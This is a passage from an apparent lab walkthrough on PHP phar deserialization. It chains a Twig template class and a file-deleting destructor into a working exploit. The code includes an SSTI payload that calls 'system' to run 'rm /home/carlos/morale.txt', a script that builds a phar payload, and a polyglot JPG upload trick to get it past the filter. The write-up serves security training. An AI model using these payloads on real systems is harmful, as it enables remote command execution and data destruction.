    private function lockFilePath()
    {
        Return 'templates/' . $this->template_file_path . '.lock';
    }
}

?>
```

Since the goal is to delete the `morale.txt`, we can start constructing our chain using the magic methods present.

```php
CustomTemplate->template_file_path;
```

Since the destructor method will be called at the end of the lifecycle, it is possible to delete the file using the `unlink` function. Secondly, look at the following source code and try to chain them together.

```php
<?php

require_once('/usr/local/envs/php-twig-1.19/vendor/autoload.php');

class Blog {
    public $user;
    public $desc;
    private $twig;

    public function __construct($user, $desc) {
        $this->user = $user;
        $this->desc = $desc;
    }

    public function __toString() {
        return $this->twig->render('index', ['user' => $this->user]);
    }

    public function __wakeup() {
        $loader = new Twig_Loader_Array([
            'index' => $this->desc,
        ]);
        $this->twig = new Twig_Environment($loader);
    }

    public function __sleep() {
        return ["user", "desc"];
    }
}

?>
```

In the second snippet, the code implements a blog template using the Twig template engine. In the same code, the wakeup method will be automatically triggered in the object's life cycle. First is to test if the application is vulnerable to an SSTI vulnerability. Since the blog does not sanitize the content from `desc`, it is vulnerable to Server Side Template Injection (SSTI) vulnerability. An attacker can leverage this vulnerability to delete the file, as shown in the code below.

```php
<?php

class Blog
{
    public $desc;
    public $user;
}

class CustomTemplate
{
    public  $template_file_path;
}

$new_blog = new Blog();
$new_template = new CustomTemplate();
$new_blog->desc = '{{_self.env.registerUndefinedFunctionCallback("system")}}{{_self.env.getFunction("rm /home/carlos/morale.txt")}}';
$new_blog->user = 'peter';
$new_template->template_file_path = $new_blog;
```

The application does not have a serializable session, as in previous challenges. Therefore, we need to find an entry point for our attack. Since the application allows image upload, we can leverage this to exploit the vulnerability. To achieve this, one needs to create a polyglot file, with a `Phar` masquerading as a simple `JPG` to bypass websites' security mechanisms.

From the information above, we can craft an exploit as shown below.

```php
<?php

class Blog
{
    public $desc;
    public $user;
}

class CustomTemplate
{
    public  $template_file_path;
}
$phar  = new Phar("/tmp/pwn.phar");
$new_blog = new Blog();
$new_template = new CustomTemplate();
$new_blog->desc = '{{_self.env.registerUndefinedFunctionCallback("system")}}{{_self.env.getFunction("rm /home/carlos/morale.txt")}}';
$new_blog->user = 'peter';
$new_template->template_file_path = $new_blog;

$phar->startBuffering();
$phar->setMetadata($new_template);
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
$phar->addFromString('_', '_');
$phar->stopBuffering();

```

By executing the above code, we generate a phar file as shown below.

{{< image src="/deserialization/phar.png" caption="Phar Payload" >}}

Since the phar is not a valid JPG, we need to adapt the payload to make it a valid JPG file and bypass the website restrictions. Running the generated payload, we get an error.

{{< image src="/deserialization/phar-error.png" caption="Phar Error" >}}

The response error means our payload was not correctly formatted. To solve the lab, we adapt the `phar-jpg-polygot` script with our code and solve the lab. The script can be downloaded from [phar-jpg-polygot](https://github.com/kunte0/phar-jpg-polyglot/blob/master/phar_jpg_polyglot.php).

By uploading the newly generated polygot file, we are able to successfully solve the challenge.

## References

1. [PHPGCC](https://github.com/ambionics/phpggc) - PHP Generic Gadget Chains
2. [ysoserial](https://github.com/frohoff/ysoserial) - Unsafe Java object deserialization proof-of-concept tool
3. [Ruby 2.x Universal RCE Deserialization Gadget Chain](https://www.elttam.com/blog/ruby-deserialization/)
4. [Universal Deserialisation Gadget for Ruby](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)
5. [Discovering Deserialization Gadget Chains in Rubyland](https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/)
6. [PHP deserialization attacks and a new gadget chain in Laravel](https://blog.quarkslab.com/php-deserialization-attacks-and-a-new-gadget-chain-in-laravel.html)
